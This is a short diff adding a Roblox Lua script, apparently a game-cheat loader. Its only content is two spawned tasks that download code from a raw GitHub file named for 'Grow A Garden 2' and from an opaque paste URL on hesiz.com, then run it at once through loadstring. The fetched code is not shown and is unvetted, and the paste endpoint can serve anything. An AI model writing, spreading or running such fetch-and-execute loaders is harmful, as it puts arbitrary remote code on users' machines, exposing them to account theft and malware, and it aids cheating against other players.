@@ -1,0 +1,7 @@
+task.spawn(function()
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/Kenniel123/Grow-A-Garden-2/refs/heads/main/Grow%20A%20Garden%202"))()
+end)
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://hesiz.com/api/uu2EJJYW/raw"))()
+end)
